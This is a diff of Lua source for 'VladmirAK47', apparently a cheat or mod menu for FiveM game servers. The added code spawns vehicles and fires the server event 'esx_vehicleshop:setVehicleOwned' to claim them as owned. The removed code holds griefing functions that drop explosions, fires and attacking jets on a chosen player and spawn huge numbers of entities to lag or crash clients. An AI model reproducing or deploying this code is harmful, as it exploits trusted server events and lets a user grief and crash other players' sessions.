+                                        SetBlipNameToPlayerName(blip, i)
+                                    end
+                                elseif blipSprite ~= 1 then
+                                    SetBlipSprite(blip, 1)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
+                                    SetBlipNameToPlayerName(blip, i)
+                                end
+                                passengers = GetVehicleNumberOfPassengers(veh)
+                                if passengers then
+                                    if not IsVehicleSeatFree(veh, -1) then
+                                        passengers = passengers + 1
+                                    end
+                                    ShowNumberOnBlip(blip, passengers)
+                                else
+                                    HideNumberOnBlip(blip)
+                                end
+                            else
+                                HideNumberOnBlip(blip)
+                                if blipSprite ~= 1 then
+                                    SetBlipSprite(blip, 1)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
+                                    SetBlipNameToPlayerName(blip, i)
+                                end
+                            end
+                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
+                            SetBlipNameToPlayerName(blip, i)
+                            SetBlipScale(blip, 0.85)
+                            if IsPauseMenuActive() then
+                                SetBlipAlpha(blip, 255)
+                            else
+                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
+                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
+                                distance =
+                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
+                                    900
+                                if distance < 0 then
+                                    distance = 0
+                                elseif distance > 255 then
+                                    distance = 255
+                                end
+                                SetBlipAlpha(blip, distance)
+                            end
+                        end
+                    else
+                        RemoveBlip(blip)
+                    end
+                end
+            end
         end
     end
-    return peds
-end
+)
 
-function GetAllVehicles()
-    local vehicles = {}
-    for vehicle in EnumerateVehicles() do
-        if DoesEntityExist(vehicle) then
-            table.insert(vehicles, vehicle)
+local function fv()
+    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
+    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
+    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
+        RequestModel(cb)
+        while not HasModelLoaded(cb) do
+            Citizen.Wait(0)
         end
+        local veh =
+            CreateVehicle(
+            GetHashKey(cb),
+            GetEntityCoords(PlayerPedId(-1)),
+            GetEntityHeading(PlayerPedId(-1)),
+            true,
+            true
+        )
+        SetVehicleNumberPlateText(veh, cw)
+        local cx = ESX.Game.GetVehicleProperties(veh)
+        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
+        av('~g~~h~Success', false)
+    else
+        av('~b~~h~Model is not valid!', true)
     end
-    return vehicles
 end
 
+local function e()
+    local name = GetPlayerName(PlayerId())
+end
+local o = {}
+local h = false
+rot = 1
+local j = false
+local bw = true
+local b8 = false
+local b9 = false
+local ba = false
+local bb = false
+local bc = nil
+local bd = {
+        {
+            name = "Spoilers", id = 0
+        }, {
+            name = "Front Bumper", id = 1
+        }, {
+            name = "Rear Bumper", id = 2
+        }, {
+            name = "Side Skirt", id = 3
+        }, {
+            name = "Exhaust", id = 4
+        }, {
+            name = "Frame", id = 5
+        }, {
+            name = "Grille", id = 6
+        }, {
+            name = "Hood", id = 7
+        }, {
+            name = "Fender", id = 8
+        }, {
+            name = "Right Fender", id = 9
+        }, {
+            name = "Roof", id = 10
+        }, {
+            name = "Vanity Plates", id = 25
+        }, {
+            name = "Trim", id = 27
+        }, {
+            name = "Ornaments", id = 28
+        }, {
+            name = "Dashboard", id = 29
+        }, {
+            name = "Dial", id = 30
+        }, {
+            name = "Door Speaker", id = 31
+        }, {
+            name = "Seats", id = 32
+        }, {
+            name = "Steering Wheel", id = 33
+        }, {
+            name = "Shifter Leavers", id = 34
+        }, {
+            name = "Plaques", id = 35
+        }, {
+            name = "Speakers", id = 36
+        }, {
+            name = "Trunk", id = 37
+        }, {
+            name = "Hydraulics", id = 38
+        }, {
+            name = "Engine Block", id = 39
+        }, {
+            name = "Air Filter", id = 40
+        }, {
+            name = "Struts", id = 41
+        }, {
+            name = "Arch Cover", id = 42
+        }, {
+            name = "Aerials", id = 43
+        }, {
+            name = "Trim 2", id = 44
+        }, {
+            name = "Tank", id = 45
+        }, {
+            name = "Windows", id = 46
+        }, {
+            name = "Livery", id = 48
+        }, {
+            name = "Wheels", id = 23
+        }, {
+            name = "Wheel Types", id = "wheeltypes"
+        }, {
+            name = "Extras", id = "extra"
+        }, {
+            name = "Neons", id = "neon"
+        }, {
+            name = "Paint", id = "paint"
+        }, {
+            name = "Headlights Color", id = "headlight"
+        },  {
+            name = "Licence Plate", id = "licence"                           
+        }
+    }
+    
+    local be = {
+        {
+            name = "Engine", id = 11
+        }, {
+            name = "Brakes", id = 12
+        }, {
+            name = "Transmission", id = 13
+        }, {
+            name = "Suspension", id = 15
+        }
+    }
+    
+    local bo = {
+        {
+            name = "Default", id = -1
+        }, {
+            name = "White", id = 0
+        }, {
+            name = "Blue", id = 1
+        }, {
+            name = "Electric Blue", id = 2
+        }, {
+            name = "Mint Green", id = 3
+        }, {
+            name = "Lime Green", id = 4
+        }, {
+            name = "Yellow", id = 5
+        }, {
+            name = "Golden Shower", id = 6
+        }, {
+            name = "Orange", id = 7
+        }, {
+            name = "Red", id = 8
+        }, {
+            name = "Pony Pink", id = 9
+        }, {
+            name = "Hot Pink", id = 10
+        }, {
+            name = "Purple", id = 11
+        }, {
+            name = "Blacklight", id = 12
+        }
+    }
+    
+    local colors = {
+        ["White"] = {
+            255, 255, 255
+        }, ["Blue"] = {
+            0, 0, 255
+        }, ["Electric Blue"] = {
+            0, 150, 255
+        }, ["Mint Green"] = {
+            50, 255, 155
+        }, ["Lime Green"] = {
+            0, 255, 0
+        }, ["Yellow"] = {
+            255, 255, 0
+        }, ["Golden Shower"] = {
+            204, 204, 0
+        }, ["Orange"] = {
+            255, 128, 0
+        }, ["Red"] = {
+            255, 0, 0
+        }, ["Pony Pink"] = {
+            255, 102, 255
+        }, ["Hot Pink"] = {
+            255, 0, 255
+        }, ["Purple"] = {
+            153, 0, 153
+        }
+    }
+    
+	-- 4x482
+	
+    local bg = {
+        {
+            name = "Black", id = 0
+        }, {
+            name = "Carbon Black", id = 147
+        }, {
+            name = "Graphite", id = 1
+        }, {
+            name = "Anhracite Black", id = 11
+        }, {
+            name = "Black Steel", id = 2
+        }, {
+            name = "Dark Steel", id = 3
+        }, {
+            name = "Silver", id = 4
+        }, {
+            name = "Bluish Silver", id = 5
+        }, {
+            name = "Rolled Steel", id = 6
+        }, {
+            name = "Shadow Silver", id = 7
+        }, {
+            name = "Stone Silver", id = 8
+        }, {
+            name = "Midnight Silver", id = 9
+        }, {
+            name = "Cast Iron Silver", id = 10
+        }, {
+            name = "Red", id = 27
+        }, {
+            name = "Torino Red", id = 28
+        }, {
+            name = "Formula Red", id = 29
+        }, {
+            name = "Lava Red", id = 150
+        }, {
+            name = "Blaze Red", id = 30
+        }, {
+            name = "Grace Red", id = 31
+        }, {
+            name = "Garnet Red", id = 32
+        }, {
+            name = "Sunset Red", id = 33
+        }, {
+            name = "Cabernet Red", id = 34
+        }, {
+            name = "Wine Red", id = 143
+        }, {
+            name = "Candy Red", id = 35
+        }, {
+            name = "Hot Pink", id = 135
+        }, {
+            name = "Pfsiter Pink", id = 137
+        }, {
+            name = "Salmon Pink", id = 136
+        }, {
+            name = "Sunrise Orange", id = 36
+        }, {
+            name = "Orange", id = 38
+        }, {
+            name = "Bright Orange", id = 138
+        }, {
+            name = "Gold", id = 99
+        }, {
+            name = "Bronze", id = 90
+        }, {
+            name = "Yellow", id = 88
+        }, {
+            name = "Race Yellow", id = 89
+        }, {
+            name = "Dew Yellow", id = 91
+        }, {
+            name = "Dark Green", id = 49
+        }, {
+            name = "Racing Green", id = 50
+        }, {
+            name = "Sea Green", id = 51
+        }, {
+            name = "Olive Green", id = 52
+        }, {
+            name = "Bright Green", id = 53
+        }, {
+            name = "Gasoline Green", id = 54
+        }, {
+            name = "Lime Green", id = 92
+        }, {
+            name = "Midnight Blue", id = 141
+        }, {
+            name = "Galaxy Blue", id = 61
+        }, {
+            name = "Dark Blue", id = 62
+        }, {
+            name = "Saxon Blue", id = 63
+        }, {
+            name = "Blue", id = 64
+        }, {
+            name = "Mariner Blue", id = 65
+        }, {
+            name = "Harbor Blue", id = 66
+        }, {
+            name = "Diamond Blue", id = 67
+        }, {
+            name = "Surf Blue", id = 68
+        }, {
+            name = "Nautical Blue", id = 69
+        }, {
+            name = "Racing Blue", id = 73
+        }, {
+            name = "Ultra Blue", id = 70
+        }, {
+            name = "Light Blue", id = 74
+        }, {
+            name = "Chocolate Brown", id = 96
+        }, {
+            name = "Bison Brown", id = 101
+        }, {
+            name = "Creeen Brown", id = 95
+        }, {
+            name = "Feltzer Brown", id = 94
+        }, {
+            name = "Maple Brown", id = 97
+        }, {
+            name = "Beechwood Brown", id = 103
+        }, {
+            name = "Sienna Brown", id = 104
+        }, {
+            name = "Saddle Brown", id = 98
+        }, {
+            name = "Moss Brown", id = 100
+        }, {
+            name = "Woodbeech Brown", id = 102
+        }, {
+            name = "Straw Brown", id = 99
+        }, {
+            name = "Sandy Brown", id = 105
+        }, {
+            name = "Bleached Brown", id = 106
+        }, {
+            name = "Schafter Purple", id = 71
+        }, {
+            name = "Spinnaker Purple", id = 72
+        }, {
+            name = "Midnight Purple", id = 142
+        }, {
+            name = "Bright Purple", id = 145
+        }, {
+            name = "Cream", id = 107
+        }, {
+            name = "Ice White", id = 111
+        }, {
+            name = "Frost White", id = 112
+        }
+    }
+    
+    local bi = {
+        {
+            name = "Black", id = 12
+        }, {
+            name = "Gray", id = 13
+        }, {
+            name = "Light Gray", id = 14
+        }, {
+            name = "Ice White", id = 131
+        }, {
+            name = "Blue", id = 83
+        }, {
+            name = "Dark Blue", id = 82
+        }, {
+            name = "Midnight Blue", id = 84
+        }, {
+            name = "Midnight Purple", id = 149
+        }, {
+            name = "Schafter Purple", id = 148
+        }, {
+            name = "Red", id = 39
+        }, {
+            name = "Dark Red", id = 40
+        }, {
+            name = "Orange", id = 41
+        }, {
+            name = "Yellow", id = 42
+        }, {
+            name = "Lime Green", id = 55
+        }, {
+            name = "Green", id = 128
+        }, {
+            name = "Forest Green", id = 151
+        }, {
+            name = "Foliage Green", id = 155
+        }, {
+            name = "Olive Darb", id = 152
+        }, {
+            name = "Dark Earth", id = 153
+        }, {
+            name = "Desert Tan", id = 154
+        }
+    }
+    
+    local bj = {
+        {
+            name = "Brushed Steel", id = 117
+        }, {
+            name = "Brushed Black Steel", id = 118
+        }, {
+            name = "Brushed Aluminum", id = 119
+        }, {
+            name = "Pure Gold", id = 158
+        }, {
+            name = "Brushed Gold", id = 159
+        }
+    }
+local bk = false
 
-------
+
 local function k(l)
     local m = {}
     local n = GetGameTimer() / 200
@@ -651,946 +1030,7 @@ local function k(l)
     m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
     return m
 end
-local menuso = {}
-local p = {
-    up = 172,
-    down = 173,
-    left = 174,
-    right = 175,
-    select = 176,
-    back = 177
-}
-local q = 0
-local s = nil
-local t = nil
-local u = 0.23
-local v = 0.13
-local w = 0.04
-local A = 1.0
-local B = 0.041
-local C = 0
-local D = 0.330
-local E = 0.007
-local F = 0.007
-local function H(I)
-    if VladmirAK47.debug then
-        Citizen.Trace('[VladmirAK47] ' .. tostring(I))
-    end
-end
-local function J(f, K, value)
-    if f and menuso[f] then
-        menuso[f][K] = value
-        H(f .. ' menu property changed: { ' .. tostring(K) .. ', ' .. tostring(value) .. ' }')
-    end
-end
-local function L(f)
-    if f and menuso[f] then
-        return menuso[f].visible
-    else
-        return false
-    end
-end
-local function M(f, N, O)
-    if f and menuso[f] then
-        J(f, 'visible', N)
-        if not O and menuso[f] then
-            J(f, 'currentOption', 1)
-        end
-        if N then
-            if f ~= t and L(t) then
-                M(t, false)
-            end
-            t = f
-        end
-    end
-end
-local function P(I, x, y, Q, R, S, T, U, V)
-    SetTextColour(R.r, R.g, R.b, R.a)
-    SetTextFont(Q)
-    SetTextScale(S, S)
-    if U then
-        SetTextDropShadow(2, 2, 0, 0, 0)
-    end
-    if menuso[t] then
-        if T then
-            SetTextCentre(T)
-        elseif V then
-            SetTextWrap(menuso[t].x, menuso[t].x + u - E)
-            SetTextRightJustify(true)
-        end
-    end
-    SetTextEntry('STRING')
-    AddTextComponentString(I)
-    DrawText(x, y)
-end
-local function W(x, y, X, height, R)
-    DrawRect(x, y, X, height, R.r, R.g, R.b, R.a)
-end
-local function Y()
-    if menuso[t] then
-        local x = menuso[t].x + u / 2
-        local y = menuso[t].y + v / 2
-        if menuso[t].titleBackgroundSprite then
-            DrawSprite(
-                menuso[t].titleBackgroundSprite.dict,
-                menuso[t].titleBackgroundSprite.name,
-                x,
-                y,
-                u,
-                v,
-                0.,
-                255,
-                255,
-                255,
-                255
-            )
-        else
-            W(x, y, u, v, menuso[t].titleBackgroundColor)
-        end
-        P(menuso[t].title, x, y - v / 2 + w, menuso[t].titleFont, menuso[t].titleColor, A, true)
-    end
-end	
-						
 
-	
-	
-    function RRR3(player)  
-        Citizen.CreateThread(function() 
-            local coords = GetEntityCoords(PlayerPedId())
-	            	SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
-	                NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
-	                       SetPlayerInvincible(ped, false)
-	                     TriggerCustomEvent(false, 'playerSpawned', coords.x, coords.y, coords.z)
-	                          ClearPedBloodDamage(ped)
-	            StopScreenEffect('DeathFailOut') 
-		end)    
-    end	
-function Jugg(player)  
-    Citizen.CreateThread(function() 
-			    local model = "mp_m_freemode_01"
-				RequestModel(GetHashKey(model)) 
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					SetPedRandomComponentVariation(PlayerPedId(), true)
-                RequestClipSet("move_ballistic_2h")	
-                RequestAnimSet("MOVE_STRAFE_BALLISTIC")				
-			    Citizen.Wait(500)
-	            local playerPed = GetPlayerPed(-1)				
-				ResetPedMovementClipset(playerPed, 1.0);
-				ResetPedStrafeClipset(playerPed);
-				SetPedUsingActionMode(playerPed, true, -1, 0); -- When value is "true", player leaves vehicle with engine running (cars mostly).			
-				SetPedMovementClipset(playerPed, "ANIM_GROUP_MOVE_BALLISTIC", 1.0);
-				SetPedStrafeClipset(playerPed, "MOVE_STRAFE_BALLISTIC");
-				SetWeaponAnimationOverride(playerPed, 0x5534A626);
-				SetPedComponentVariation(playerPed, 3, 2, 0, 0); -- Upper
-				SetPedComponentVariation(playerPed, 4, 2, 0, 0); -- Lower
-				SetPedComponentVariation(playerPed, 5, 1, 0, 0); -- Hands
-				SetPedComponentVariation(playerPed, 6, 2, 0, 0); -- Shoes / Juggernaut Mask
-				SetPedComponentVariation(playerPed, 8, 2, 0, 0); -- Accessory 0
-				SetPedComponentVariation(playerPed, 9, 0, 0, 0); -- Accessory 1
-				SetPedComponentVariation(playerPed, 10, 0, 0, 0); -- Badges
-				SetPedPropIndex(playerPed, 0, 24, 0, false); -- Hats
-				--ClearPedProp(playerPed, 1);
-				ClearPedBloodDamage(playerPed);
-				ClearPedBloodDamage(playerPed);
-				SetEntityMaxHealth(playerPed, 2000);
-				SetPedMaxHealth(playerPed, 2000);
-				SetEntityHealth(playerPed, 2000);
-				SetPedComponentVariation(playerPed, 0, 0, 0, 0); -- Head
-				SetPedComponentVariation(playerPed, 1, 104, 25, 0); -- Beard
-				SetPedComponentVariation(playerPed, 2, 57, 0, 0); -- Hair
-				SetPedComponentVariation(playerPed, 3, 31, 0, 0); -- Upper
-				SetPedComponentVariation(playerPed, 4, 84, 0, 0); -- Lower
-				SetPedComponentVariation(playerPed, 5, 0, 0, 0); -- Hands
-				SetPedComponentVariation(playerPed, 6, 33, 0, 0); -- Shoes / Juggernaut Mask
-				SetPedComponentVariation(playerPed, 7, 0, 1, 0); -- Theeth
-				SetPedComponentVariation(playerPed, 8, 97, 0, 0); -- Accessory 0
-				SetPedComponentVariation(playerPed, 9, 0, 0, 0); -- Accessory 1
-				SetPedComponentVariation(playerPed, 10, 0, 0, 0); -- Badges
-				SetPedComponentVariation(playerPed, 11, 186, 0, 0); -- Shirt Overlay
-				SetPedPropIndex(playerPed, 0, 39, 0, false); -- Hats
-				SetPedPropIndex(playerPed, 1, 15, 1, false); -- Glasses
-				SetPedPropIndex(playerPed, 2, 3, 0, false); -- Misc
-				GiveWeaponToPed(playerPed, 0x42BF8A85, -1, true, false); -- Equips player with Minigun.
-				SetWeaponAnimationOverride(playerPed, 0x5534A626); -- Main Ballistic weapon iddle /stand animation.
-				end
-	end)    
-end		
-
-    function Zombie(player) 
- 
-        Citizen.CreateThread(function() 
-            RequestModelSync("a_m_o_acult_01") 
-            count = 0
-            for b = 0, 1000 do 
-                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
-                local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false)  
-                SetEntityInvincible(bD, true) count = count - 0.4
-				Citizen.Wait(10)
-				DeletePed(bD)
-			end	 
-		end)    
-    end
-	
-	    function Zombie10(player)  
-        Citizen.CreateThread(function() 
-            RequestModelSync("a_c_hen") 
-                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
-                local bD = CreatePed(4, GetHashKey("a_c_hen"), x, y, z + 0.8, 0.0, true, false)			 
-		end)    
-    end	
-    function Freezeall2(player)  
-        Citizen.CreateThread(function() 
-					local target = PlayerPedId(player)
-                    local pos = GetEntityCoords(GetPlayerPed(player))
-                    local xf = GetEntityForwardX(GetPlayerPed(player))
-                    local yf = GetEntityForwardY(GetPlayerPed(player))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(player), 0, 0, -0.4)
-                    RequestModel('prop_gascage01')
-                    while not HasModelLoaded('prop_gascage01') do
-                        RequestModel('prop_gascage01')
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded('prop_gascage01') then
-						local v = CreateObject(GetHashKey('prop_gascage01'), pos.x, pos.y, pos.z, true, true, true)
-                        FreezeEntityPosition(v, true)
-                        SetEntityVisible(v, false, true)
-
-                    end			 
-		end)    
-    end	  	
-	
-	    function Airstrike(player)  
-        Citizen.CreateThread(function() 
-	                    local veh = ("lazer")
-                    for i = 0, 0 do
-					local target = GetPlayerPed(player)
-                    local pos = GetEntityCoords(GetPlayerPed(player))
-                    local pitch = GetEntityPitch(GetPlayerPed(player))
-                    local roll = GetEntityRoll(GetPlayerPed(player))
-                    local yaw = GetEntityRotation(GetPlayerPed(player)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(player))
-                    local yf = GetEntityForwardY(GetPlayerPed(player))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 90),
-                            pos.y - (yf * 90),
-                            pos.z + 700,
-                            GetEntityHeading(GetPlayerPed(player)),
-                            true,
-                            false
-                        )
-						local v1 = CreateVehicle(veh, pos.x + 300, pos.y, pos.z + 600, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v1, -1)
-                                    TaskPlaneChase(ped, GetVehiclePedIsUsing(GetPlayerPed(player)), 100.00, 786468)
-									TaskPlaneChase(ped1, (GetPlayerPed(player)), 100.00, 786468)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-									SetDriverAbility(ped1, 10.0)
-                                    SetDriverAggressiveness(ped1, 10.0)
-									TaskCombatPed(ped, target, 0, 16)
-								    TaskCombatPed(ped1, target, 0, 16)
-								    SetPedKeepTask(ped, true)
-								    SetPedKeepTask(ped1, true)
-                                end
-                            end
-                        end
-					end	
-			end	 
-		end)    
-    end
-    function Zombie99(player)  
-        Citizen.CreateThread(function() 
-            RequestModelSync("Tug") 
-            count = 0
-            for b = 0, 1000000000000000 do 
-                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
-                local v = CreateVehicle(GetHashKey("Tug"), x, y, z, 0.0, true, true)				
-                SetEntityInvincible(v, true) count = count - 0.4
-				Citizen.Wait(10)
-				DeletePed(v)
-			end	 
-		end)    
-    end		
-    function Lagf(player) 
-        Citizen.CreateThread(function() 	
-        Citizen.Wait(0.1) -- This sends a notification every 1 second.
-		            local veh = ("CargoPlane")
-					local target = PlayerPedId(player)
-                    local pos = GetEntityCoords(GetPlayerPed(player))
-                    RequestModel(veh)
-                    while not HasModelLoaded(veh) do
-                        RequestModel(veh)
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded(veh) then
-						local v = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v)
-                        SetEntityVisible(v, false, true)
-                        FreezeEntityPosition(v, true)
-												local v1 = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v1)
-                        SetEntityVisible(v1, false, true)
-                        FreezeEntityPosition(v1, true)
-												local v2 = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v2)
-                        SetEntityVisible(v2, false, true)
-                        FreezeEntityPosition(v2, true)
-												local v3 = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v3)
-                        SetEntityVisible(v3, false, true)
-                        FreezeEntityPosition(v3, true)
-												local v4 = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v4)
-                        SetEntityVisible(v4, false, true)
-                        FreezeEntityPosition(v4, true)
-												local v5 = CreateVehicle(veh, pos.x, pos.y, pos.z - 2, GetEntityHeading(target), true, true)
-						NetworkRequestControlOfEntity(v5)
-                        SetEntityVisible(v5, false, true)
-                        FreezeEntityPosition(v5, true)
-					end 
-		end)    
-    end	
-    function Zombie3(player)  
-        Citizen.CreateThread(function() 
-            RequestModelSync("a_m_o_acult_01") 
-            count = 0
-            for b = 0, 10 do 
-                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(player), true)) 
-                local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, false, true)  
-                local pos = GetEntityCoords(bD)
-                local fire = StartScriptFire (pos.x, pos.y, pos.z, 100, false)
-				Citizen.Wait(100)
-				DeletePed(bD)
-			end	 
-		end)    
-    end       	
-    function BurnV2(player) 
-        Citizen.CreateThread(function() 
-            local Pos = GetEntityCoords(GetPlayerPed(player)) 
-            AddExplosion (Pos.x, Pos.y, Pos.z, 29, 0.0, false, false, 0.0)	
-		end)    
-    end                                           
-    function BurnV1(player) 
-        Citizen.CreateThread(function() 
-            local Pos = GetEntityCoords(GetPlayerPed(player)) 
-            AddExplosion (Pos.x, Pos.y, Pos.z, 14, 0.0, false, false, 0.0)	
-		end)    
-    end
-   function Failall(player) 
-        Citizen.CreateThread(function() 
-                        local Pos = GetEntityCoords(GetPlayerPed(player)) 						
-                        AddExplosion (Pos.x, Pos.y, Pos.z - 2, 11, 5.0, true, true, 0.0)
-                        AddExplosion (Pos.x, Pos.y + 0.5, Pos.z - 1.8, 11, 5.0, true, true, 0.0)    	
-		end)    
-    end	
-    function Smoking(player) 
-        Citizen.CreateThread(function() 
-                        local Pos = GetEntityCoords(GetPlayerPed(player)) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x + 0.3, Pos.y, Pos.z - 1, 24, 5.0, false, false, 0.0)
-                        AddExplosion (Pos.x, Pos.y + 0,5, Pos.z - 1, 24, 5.0, false, false, 0.0)
-		end)    
-    end			
-    function Launch(player) 
-        Citizen.CreateThread(function() 
-            local Pos = GetEntityCoords(GetPlayerPed(player)) 
-            AddExplosion (Pos.x, Pos.y, Pos.z, 13, 5.0, false, false, 0.0)	
-		end)    
-    end
-    function Light1(player) 
-        Citizen.CreateThread(function() 
-                        local Pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-						AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROGRAMMABLEAR, 99, false, false, 0.0) 
-                        AddExplosion (Pos.x, Pos.y, Pos.z, EXPLOSION_PROPANE, 99, false, false, 0.0)
-						AddExplosion (Pos.x, Pos.y, Pos.z + 1.2, 29, 0.0, false, true, 0.0)	
-		end)    
-    end 	    
-    function Launch1(player) 
-        Citizen.CreateThread(function() 
-            local Pos = GetEntityCoords(GetPlayerPed(player)) 
-            AddExplosion (Pos.x, Pos.y, Pos.z, 18, 1.0, true, true, 0.0)	
-		end)    
-    end		
-    function Silentkill(player) 
-        Citizen.CreateThread(function() 
-		    local Pos = GetEntityCoords(GetPlayerPed(player))
-            AddExplosion(Pos.x, Pos.y, Pos.z, 26, FLT_MAX, false, true, 0.0) 
-		end)    
-    end	
-    function StartFire(player) 
-        Citizen.CreateThread(function() 
-	                  for i = 0, 75 do 				
-				    local pos = GetEntityCoords(GetPlayerPed(player))
-                    local fire = StartScriptFire (pos.x, pos.y, pos.z, 1, true)
-					Citizen.Wait(300)
-                    RemoveScriptFire(fire)
-					end
-		end)    
-    end	
-local function Z()
-    if menuso[t] then
-        local x = menuso[t].x + u / 2
-        local y = menuso[t].y + v + B / 2
-        local a0 = {
-            r = menuso[t].titleBackgroundColor.r,
-            g = menuso[t].titleBackgroundColor.g,
-            b = menuso[t].titleBackgroundColor.b,
-            a = 255
-        }
-        W(x, y, u, B, menuso[t].subTitleBackgroundColor)
-        P(menuso[t].subTitle, menuso[t].x + E, y - B / 2 + F, C, a0, D, false)
-        if q > menuso[t].maxOptionCount then
-            P(
-                tostring(menuso[t].currentOption) .. ' / ' .. tostring(q),
-                menuso[t].x + u,
-                y - B / 2 + F,
-                C,
-                a0,
-                D,
-                false,
-                false,
-                true
-            )
-        end
-    end
-end
-local function a1(I, a2)
-    local x = menuso[t].x + u / 2
-    local a3 = nil
-    if menuso[t].currentOption <= menuso[t].maxOptionCount and q <= menuso[t].maxOptionCount then
-        a3 = q
-    elseif q > menuso[t].currentOption - menuso[t].maxOptionCount and q <= menuso[t].currentOption then
-        a3 = q - (menuso[t].currentOption - menuso[t].maxOptionCount)
-    end
-    if a3 then
-        local y = menuso[t].y + v + B + B * a3 - B / 2
-        local a4 = nil
-        local a5 = nil
-        local a6 = nil
-        local U = false
-        if menuso[t].currentOption == q then
-            a4 = menuso[t].menuFocusBackgroundColor
-            a5 = menuso[t].menuFocusTextColor
-            a6 = menuso[t].menuFocusTextColor
-        else
-            a4 = menuso[t].menuBackgroundColor
-            a5 = menuso[t].menuTextColor
-            a6 = menuso[t].menuSubTextColor
-            U = true
-        end
-        W(x, y, u, B, a4)
-        P(I, menuso[t].x + E, y - B / 2 + F, C, a5, D, false, U)
-        if a2 then
-            P(a2, menuso[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
-        end
-    end
-end
-
-function VladmirAK47.CreateMenu(f, a7)
-    menuso[f] = {}
-    menuso[f].title = "🈂️🈺🎆2"
-    menuso[f].subTitle = G
-    menuso[f].visible = false
-    menuso[f].previousMenu = nil
-    menuso[f].aboutToBeClosed = false
-    menuso[f].x = 0.75
-    menuso[f].y = 0.09
-    menuso[f].currentOption = 1
-    menuso[f].maxOptionCount = 15
-    menuso[f].titleFont = 7
-    menuso[f].titleColor = {
-        r = 200,
-        g = 75,
-        b = 2,
-        a = 215
-    }
-    Citizen.CreateThread(
-        function()
-            while true do
-                Citizen.Wait(0)
-                local a8 = k(1.0)
-                menuso[f].titleBackgroundColor = {
-                    --r = a8.r,
-                    --g = a8.g,
-                    --b = a8.b,
-                    r = 15,
-                    g = 15,
-                    b = 15,
-                    a = 255
-                }
-                menuso[f].menuFocusBackgroundColor = {
-                    r = 155,
-                    g = 155,
-                    b = 155,
-                    a = 155
-                }
-            end
-        end
-    )
-    menuso[f].titleBackgroundSprite = nil
-    menuso[f].menuTextColor = {
-        r = 200,
-        g = 200,
-        b = 200,
-        a = 255
-    }
-    menuso[f].menuSubTextColor = {
-        r = 155,
-        g = 155,
-        b = 155,
-        a = 255
-    }
-    menuso[f].menuFocusTextColor = {
-        r = 244,
-        g = 56,
-        b = 45,
-        a = 255
-    }
-    menuso[f].menuBackgroundColor = {
-        r = 15,
-        g = 15,
-        b = 15,
-        a = 255
-    }
-    menuso[f].subTitleBackgroundColor = {
-        r = 70,
-        g = 45,
-        b = 45,
-        a = 255
-    }
-    menuso[f].buttonPressedSound = {
-        name = '~h~~p~▶ ~s~SELECT',
-        set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
-    }
-    H(tostring(f) .. ' menu created')
-end
-
-function VladmirAK47.CreateSubMenu(f, a9, aa)
-    if menuso[a9] then
-        VladmirAK47.CreateMenu(f, menuso[a9].title)
-        if aa then
-            J(f, 'subTitle', aa)
-        else
